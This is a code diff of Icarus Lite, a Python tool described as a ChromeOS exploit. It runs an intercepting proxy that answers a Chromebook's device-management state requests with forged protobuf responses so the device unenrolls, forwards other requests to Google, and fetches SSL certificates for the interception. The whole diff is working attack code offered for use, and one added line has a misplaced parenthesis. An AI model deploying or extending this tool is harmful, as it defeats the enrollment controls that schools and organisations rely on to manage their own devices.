@@ -1,15 +1,7 @@
 """
-Icarus Lite v1.0
+Icarus Lite
 Written by cosmicdevv
-
-Description:
-Icarus Lite is a simple and lightweight version of the Icarus ChromeOS exploit initially written in NodeJS by Writable/Unretained/MunyDev.
-
-The goal of Icarus Lite is to simplify the codebase and make it easier to understand and modify. Icarus Lite is
-
-How Icarus/Icarus Lite work:
-ill write later lol
-
+https://github.com/cosmicdevv/Icarus-Lite
 """
 
 import os
@@ -21,8 +13,8 @@ import threading
 import select
 import re
 import http.server
-import urllib.request
 import urllib.parse
+import requests
 from dmbackend import device_management_pb2
 
 pInitial = 3001 # The port that MiniServers will start up from.
@@ -53,7 +45,6 @@ class MiniServerHandler(http.server.SimpleHTTPRequestHandler):
 
     def do_POST(self):
         # Slightly rewritten part of dmbackend
-
         # Get the body content of the request from the client
         body = self.rfile.read(int(self.headers.get("Content-Length", 0)))
         # Create a dmr object
@@ -64,7 +55,6 @@ class MiniServerHandler(http.server.SimpleHTTPRequestHandler):
         resp = None
         # all the magic originally by writable
         if (dmr.HasField("device_state_retrieval_request")):
-            print("intercepting")
             status_code = 200
             resp = device_management_pb2.DeviceManagementResponse()
             rr = resp.device_state_retrieval_response
@@ -78,18 +68,17 @@ class MiniServerHandler(http.server.SimpleHTTPRequestHandler):
             rr.restore_mode = 0
             rr.management_domain = ""
         else:
-            req = urllib.request.Request("https://m.google.com/devicemanagement/data/api?" + urllib.parse.urlparse(self.path).query, data=data, headers=dict(self.headers), method="POST")
-            with urllib.request.urlopen(req) as response:
-                status_code = response.getcode()
-                con = response.read().decode()
+            con = requests.post("https://m.google.com/devicemanagement/data/api?" + urllib.parse.urlparse(self.path).query, data=body, headers=dict(self.headers))
+            status_code = con.status_code
             resp = device_management_pb2.DeviceManagementResponse()
-            resp.ParseFromString(con)
+            resp.ParseFromString(con.content)
         # Send the response back to the client, which unenroll the device
         self.send_response(status_code)
         self.send_header("Content-Type", "application/x-protobuffer")
         self.send_header("Content-Length", str(len(resp.SerializeToString())))
         self.end_headers()
         self.wfile.write(resp.SerializeToString())
+        colorprint("Successfully intercepted request.\n\n", "green")
 
 
 class MiniServer:
@@ -174,7 +163,10 @@ def handle_client(client_socket, address):
         # Acknowledge the request, then pipe the client to the MiniServer
         client_socket.sendall(b"HTTP/1.1 200 Connection Established\r\n\r\n")
         try:
-            tunnel_traffic(client_socket, miniserver_socket)
+            pipe = tunnel_traffic(client_socket, miniserver_socket)
+            # If tunnel closed on first packet (client likely rejected connection)
+            if not pipe:
+                colorprint("ERROR: The client may have rejected the connection. This is usually an SSL issue.", "red")
         except Exception as e:
             colorprint(f"ERROR: {e}\nThe client may have rejected the connection.", "red")
             colorprint("Have you ran the Icarus shim on the target Chromebook?", "blue")
@@ -192,7 +184,10 @@ def handle_client(client_socket, address):
             server_socket.sendall(request)
         # Same as .pipe() in NodeJS but we have to do it a bit differently.
         try:
-            tunnel_traffic(client_socket, server_socket)
+            pipe = tunnel_traffic(client_socket, server_socket)
+            # If tunnel closed on first packet
+            if not pipe:
+                colorprint("ERROR: The connection may have been rejected."), "red"
         except Exception as e:
             colorprint(f"ERROR: {e}\nUnknown failure tunneling traffic.", "red")
     except Exception as e:
@@ -213,9 +208,13 @@ def tunnel_traffic(client_socket, server_socket):
             peer_sock = server_socket if sock is client_socket else client_socket
             # normally we'd put a try catch exception here but i want it to raise an error when there is one
             data = sock.recv(4096)
+            # If there's no data, the socket closed
             if not data:
-                # Socket closed
-                return
+                # If it's the first packet or something, return False for error handling purposes
+                if readable.index(sock) == 0:
+                    return False
+                return True
+            first = False
             peer_sock.sendall(data)
     client_socket.close()
     server_socket.close()
@@ -243,15 +242,15 @@ if not os.path.exists("Icarus Lite"):
     os.mkdir("Icarus Lite/autocerts")
     colorprint("Creating manual certificate folder...", "blue")
     os.mkdir("Icarus Lite/manualcerts")
-    colorprint("Creating dmbackend folder...", "blue")
-    os.mkdir("Icarus Lite/dmbackend")
 colorprint("Downloading latest Icarus SSL certificates...", "blue")
 success = True # If a download fails, this gets set to false
 # Loop through all the necessary SSL certificates, where their filename is the key and the download url is the value
 for sslCert in sslCerts:
     try:
         # Try to download the certificate from the url and place it in the autocerts folder
-        urllib.request.urlretrieve(sslCerts[sslCert], f"Icarus Lite/autocerts/{sslCert}")
+        response = requests.get(sslCerts[sslCert])
+        with open(f"Icarus Lite/autocerts/{sslCert}", 'wb') as file:
+            file.write(response.content)
         if firstTime:
             # Create a backup copy of the certificate in the manualcerts folder
             shutil.copy(f"Icarus Lite/autocerts/{sslCert}", f"Icarus Lite/manualcerts/{sslCert}")
